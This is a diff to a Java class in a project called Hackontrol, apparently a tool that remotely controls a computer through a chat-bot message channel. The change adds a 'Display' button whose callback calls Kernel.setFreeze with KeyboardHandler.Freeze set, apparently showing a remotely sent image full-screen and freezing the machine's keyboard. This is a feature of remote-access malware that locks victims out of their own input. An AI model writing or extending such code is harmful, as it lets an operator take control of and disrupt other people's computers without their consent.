@@ -90,20 +90,25 @@ public class ImagePanel extends Panel {
 				return;
 			}
 
+			byte[] data;
 			FileUpload upload;
 
 			try {
 				ByteArrayOutputStream stream = new ByteArrayOutputStream();
 				Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
 				ImageIO.write(ImageTransform.transform(input, size.width, size.height), "png", stream);
-				upload = FileUpload.fromData(stream.toByteArray(), "image.png");
+				data = stream.toByteArray();
+				upload = FileUpload.fromData(data, "image.png");
 			} catch(Throwable Errors) {
 				HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
 				return;
 			}
 
 			Event.getMessage().delete().queue();
-			this.channel.sendFiles(upload).addActionRow(ImagePanel.BUTTON_CLOSE, HackontrolButton.delete()).queue(InteractionManager :: callback);
+			this.channel.sendFiles(upload).addActionRow(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Display", context -> {
+				Kernel.setFreeze(KeyboardHandler.Freeze = true, data);
+				context.deferEdit().queue();
+			}), ImagePanel.BUTTON_CLOSE, HackontrolButton.delete()).queue(InteractionManager :: callback);
 		});
 	}
 
